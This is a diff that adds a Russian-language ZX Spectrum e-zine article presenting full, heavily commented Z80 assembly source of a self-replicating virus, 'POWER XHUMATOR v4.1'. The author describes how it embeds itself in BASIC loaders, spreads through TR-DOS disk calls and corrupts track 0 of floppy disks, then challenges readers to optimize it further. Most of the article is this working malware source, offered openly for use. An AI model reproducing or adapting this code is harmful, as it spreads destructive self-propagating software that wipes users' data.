@@ -1,0 +1,167 @@
+ ┌─────▒░▒░▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░▒░▒────┐
+ │▓▓▓▓ ░▒░ ЗАПОЛНЕННЫМ ЧАЙНИКАМ ▒░▒░ ▓▓▓│
+ └─────▒░▒░▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░▒░▒────┘
+  
+──────────────────────────────────────────
+
+V. Как сделать реальный вирус на спектруме
+   (из неразгаданных тайн процессора Z-80)
+
+   Такого на спектруме еще не было! Народ,
+предлагаю  Вашему  вниманию  исходник гло-
+бальной разработки - вируса  под названием
+POWER  XHUMATOR версии 4.1.  Первоначально
+сей  вирус занимал #A3 байта и писался вот
+так, от балды. Но мне понравилась идея и я
+оптимизировал код вируса до #8A байт и на-
+писал  даже  инсталляшку. Что он творит? А
+творит  он  самое подлое - гадит 0 трек на
+Ваших  драгоценных  дисках, и что еще под-
+лее, так это то, что XHUM гадит 0 трек еще
+и  на  Ваших  рабочих дисках. XHUM встраи-
+вается  в BASIC-лоадеры всевозможных прог,
+не  превышающие  #XX72  байт и ждет своего
+часа.
+
+   Мало  того,  что  вирус  способен само-
+распространяться;  файлы, содержащие вирус
+inside, могут подвергаться любому насилию,
+такому как копирование, уплотнение, транс-
+портировка6  по  почте  и.т.д. Конечно, не
+гарантирована  работоспособность вируса со
+100%  файлов, но, извините меня,  это все-
+таки  всего  лишь #8A байт.
+
+   Я не буду вдаваться в принцип  работы -
+ниже приведен исходник, и те, кому это ин-
+тересно,  разберутся во всем  сами.  А для
+тупорылых ребят я  оставил  тупорылые ком-
+ментарии, которые помогут им постичь неиз-
+веданное.
+
+
+;-------------------------------
+;     POWER XHUMATOR  v4.1
+;  Special Edition For ZX-NET
+;     Koded & Optimized By
+; !mPeR!0/P0WER HaCkZ All!aNcE
+;     0f PR0 HaCkZ DyNaZ7Y
+;-------------------------------
+
+LEN  EQU     #8A
+     ORG     #8000
+     RST     #38         ;SP-2>SP, PC>(SP)
+                         ;#38>PC
+     EXX                 ;BC<>BC', DE<>DE'
+                         ;HL<>HL'
+     DEC     SP          ;SP-1>SP
+     DEC     SP          ;SP-1>SP
+     POP     AF          ;(SP)>AF, SP+2>SP
+     EX      AF,AF'      ;AF<>AF'
+     LD      HL,#C9F1    ;#C9F1>HL
+     LD      (#5CC2),HL  ;HL>(#5CC2)
+     LD      DE,#0000    ;#0000>DE
+     LD      BC,#0905    ;#0905>BC
+     PUSH    HL          ;SP-2>SP, HL>(SP)
+     PUSH    HL          ;SP-2>SP, HL>(SP)
+     CALL    #3D13       ;SP-2>SP, PC>(SP)
+                         ;#3D13>PC
+     EX      (SP),HL     ;(SP)<>HL
+FIND POP     AF          ;(SP)>AF, SP+2>SP
+     LD      A,(HL)      ;(HL)>A
+     POP     DE          ;(SP)>DE, SP+2>SP
+     AND     A           ;A AND A>A
+     JR      Z,EXIT      ;EXIT>PC if Z
+     PUSH    DE          ;SP-2>SP, DE>(SP)
+     LD      DE,#0004    ;#0004>DE
+     ADD     HL,DE       ;HL+DE>HL
+     ADD     HL,DE       ;HL+DE>HL
+     LD      A,(HL)      ;(HL)>A
+     INC     HL          ;HL+1>HL
+     LD      C,(HL)      ;(HL)>C
+     PUSH    HL          ;SP-2>SP, HL>(SP)
+     INC     HL          ;HL+1>HL
+     LD      B,(HL)      ;(HL)>B
+     ADD     HL,DE       ;HL+DE>HL
+     LD      E,(HL)      ;(HL)>E
+     INC     HL          ;HL+1>HL
+     LD      D,(HL)      ;(HL)>D
+     INC     HL          ;HL+1>HL
+     CP      "B"         ;A-"B"
+     JR      NZ,FIND     ;FIND>PC if NZ
+     LD      A,C         ;C>A
+     CP      #FD-LEN     ;A-#FD+LEN
+     JR      NC,FIND     ;FIND>PC if NC
+     POP     HL          ;(SP)>HL, SP+2>SP
+     ADD     A,LEN       ;A+LEN>A
+     LD      (HL),A      ;A>(HL)
+     LD      HL,#DD3B    ;#DD3B>HL
+     PUSH    BC          ;SP-2>SP, BC>(SP)
+     PUSH    DE          ;SP-2>SP, DE>(SP)
+     PUSH    HL          ;SP-2>SP, HL>(SP)
+     PUSH    BC          ;SP-2>SP, BC>(SP)
+     PUSH    BC          ;SP-2>SP, BC>(SP)
+     PUSH    HL          ;SP-2>SP, HL>(SP)
+     INC     B           ;B+1>B
+     LD      C,#05       ;#05>C
+     CALL    #3D13       ;SP-2>SP, PC>(SP)
+                         ;#3D13>PC
+     POP     HL          ;(SP)>HL, SP+2>SP
+     POP     BC          ;(SP)>BC, SP+2>SP
+     ADD     HL,BC       ;HL+BC>HL
+     PUSH    HL          ;SP-2>SP, HL>(SP)
+     PUSH    HL          ;SP-2>SP, HL>(SP)
+     EX      DE,HL       ;DE<>HL
+     LD      HL,LEN      ;LEN>HL
+     PUSH    HL          ;SP-2>SP, HL>(SP)
+     ADD     HL,DE       ;HL+DE>HL
+     EX      DE,HL       ;DE<>HL
+     LDIR                ;(HL)>(DE)<─────┐
+                         ;HL+1>HL,DE+1>DE│
+                         ;BC-1>BC, BC>0?─┘
+     POP     BC          ;(SP)>BC, SP+2>SP
+     POP     DE          ;(SP)>DE, SP+2>SP
+     EX      AF,AF'      ;AF<>AF'
+     PUSH    AF          ;SP-2>SP, AF>(SP)
+     POP     HL          ;(SP)>HL, SP+2>SP
+     DEC     HL          ;HL-1>HL
+     LDIR                ;(HL)>(DE)<─────┐
+                         ;HL+1>HL,DE+1>DE│
+                         ;BC-1>BC, BC>0?─┘
+     POP     DE          ;(SP)>DE, SP+2>SP
+     POP     BC          ;(SP)>BC, SP+2>SP
+     LD      H,D         ;D>H
+     LD      L,E         ;E>L
+     RES     #07,D       ;#00>D(#07)
+     LD      A,#3D       ;#3D>A
+     CPDR                ;┌─>A=(HL)──────┐
+                         ;│HL+1>HL,BC-1>BC
+                         ;└BC>0?         │
+     ADD     A,(HL)      ;(HL)>A<-───────┘
+     CP      #50         ;A-#50
+     JR      NZ,SAVE     ;SAVE>PC if NZ
+     LD      (HL),E      ;E>(HL)
+     INC     HL          ;HL+1>HL
+     LD      (HL),D      ;D>(HL)
+SAVE POP     HL          ;(SP)>HL, SP+2>SP
+     POP     DE          ;(SP)>DE, SP+2>SP
+     POP     BC          ;(SP)>BC, SP+2>SP
+     INC     B           ;B+1>B
+     LD      C,#06       ;#06>C
+     CALL    #3D13       ;SP-2>SP, PC>(SP)
+                         ;#3D13>PC
+EXIT POP     HL          ;(SP)>HL, SP+2>SP
+     LD      DE,#0000    ;#0000>DE
+     LD      BC,#0906    ;#0906>BC
+     CALL    #3D13       ;SP-2>SP, PC>(SP)
+                         ;#3D13>PC
+     EXX                 ;BC<>BC', DE<>DE'
+                         ;HL<>HL'
+     JP      #3D13       ;#3D13>PC
+
+   Наверное, все  на  этот раз. Попробуйте
+обрезать  мой  код  хотя  бы на 1 байт без
+утери функциональных возможностей XHUMа, и
+если  у Вас это получится, то звякните мне
+как-нибудь.
+ 
